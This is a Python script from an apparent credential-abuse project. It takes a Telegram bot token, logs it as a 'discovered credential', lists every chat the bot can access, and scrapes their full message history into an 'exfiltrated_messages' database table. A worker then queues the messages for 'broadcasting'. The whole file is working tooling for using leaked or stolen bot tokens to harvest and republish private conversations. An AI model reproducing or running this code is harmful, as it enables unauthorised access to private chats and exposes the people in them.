import asyncio
import sys
import os

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.services.scraper_srv import scraper_service
from app.core.database import db
from app.core.security import security
from app.core.config import settings
import hashlib

def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def run_manual_scan():
    print("🚀 Starting Standalone Manual Scraper (No Redis)...")
    
    # 1. INPUT: Ask for Token
    # Hardcode here or ask user input
    bot_token = input("Enter Bot Token to Scan: ").strip()
    if not bot_token:
        print("❌ valid token required.")
        return

    # 2. SAVE/CHECK CREDENTIAL
    print(f"\n💾 Saving/Checking credential in DB...")
    token_hash = _calculate_hash(bot_token)
    encrypted_token = security.encrypt(bot_token)
    
    data = {
        "bot_token": encrypted_token,
        "token_hash": token_hash,
        "source": "manual_script",
        "status": "pending",
        "meta": {"manual": True}
    }
    
    # Upsert
    res = db.table("discovered_credentials").upsert(data, on_conflict="token_hash", ignore_duplicates=True).select("id").execute()
    
    if res.data:
        cred_id = res.data[0]['id']
        print(f"✅ Credential Saved/Found. ID: {cred_id}")
    else:
        # If ignore_duplicates=True and row exists, it might not return data depending on Supabase version
        # Let's fetch it manually to be sure
        res = db.table("discovered_credentials").select("id").eq("token_hash", token_hash).execute()
        if res.data:
            cred_id = res.data[0]['id']
            print(f"✅ Credential Exists. ID: {cred_id}")
        else:
            print("❌ Failed to retrieve Credential ID.")
            return

    # 3. DISCOVER CHATS
    print(f"\n🔎 Discovering Chats (Direct Telethon Call)...")
    try:
        chats = await scraper_service.discover_chats(bot_token)
        print(f"✅ Found {len(chats)} chats.")
    except Exception as e:
        print(f"❌ Discovery Failed: {e}")
        return

    if not chats:
        print("⚠️ No chats found. Exiting.")
        return

    # 4. UPDATE DB & SCRAPE EACH CHAT
    for chat in chats:
        print(f"\n----------------------------------------")
        print(f"Processing Chat: {chat['name']} (ID: {chat['id']})")
        
        # Update Meta (Just for the first one primarily, or log all)
        db.table("discovered_credentials").update({
            "chat_id": chat["id"],
            "meta": {"chat_name": chat["name"], "type": chat["type"], "enriched": True}
        }).eq("id", cred_id).execute()

        # Scrape History
        print(f"⏳ Scraping History...")
        try:
            messages = await scraper_service.scrape_history(bot_token, chat["id"])
            print(f"✅ Retrieved {len(messages)} messages.")
        except Exception as e:
            print(f"❌ Scraping Failed: {e}")
            continue
            
        # Save Messages
        print(f"💾 Saving to Exfiltrated Messages...")
        new_count = 0
        for msg in messages:
            msg["credential_id"] = cred_id
            try:
                db.table("exfiltrated_messages").insert(msg).execute()
                new_count += 1
            except Exception:
                pass # Skip dups
        
        print(f"✨ Saved {new_count} NEW messages to DB.")
        
        if new_count > 0:
            print(f"⚠️ Note: These messages are set 'is_broadcasted=False'.\n   Your running Railway Worker should pick them up automatically for broadcasting soon.")

    print("\n✅ Manual Scan Complete.")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run_manual_scan())
